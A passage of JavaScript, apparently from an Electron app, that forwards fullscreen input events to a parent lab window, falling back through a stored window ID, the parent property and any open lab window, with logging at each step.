      const parentWindow = BrowserWindow.fromWebContentsId(parentWebContentsId);
      if (parentWindow && !parentWindow.isDestroyed()) {
        parentWindow.webContents.send('fullscreen-input-event', data);
        log.info('Forwarded fullscreen input to lab window (via stored reference)');
        return;
      }
    } catch (e) {
      log.warn('Error accessing parent window by ID:', e.message);
    }
  }
  
  // Second try: use fullscreen window's parent property
  if (fullscreenWindow.parent && !fullscreenWindow.parent.isDestroyed()) {
    fullscreenWindow.parent.webContents.send('fullscreen-input-event', data);
    log.info('Forwarded fullscreen input to parent window (via parent property)');
    return;
  }
  
  // Last resort: try to find any lab window
  for (const index in windows) {
    try {
      const labWindow = BrowserWindow.fromId(windows[index]);
      if (labWindow && !labWindow.isDestroyed()) {
        labWindow.webContents.send('fullscreen-input-event', data);
        log.info(`Forwarded fullscreen input to lab window ${index} (fallback)`);
        return;
      }
    } catch (e) {
      // Continue searching
    }
  }
  
  log.warn('Could not find parent window to forward fullscreen input');
});


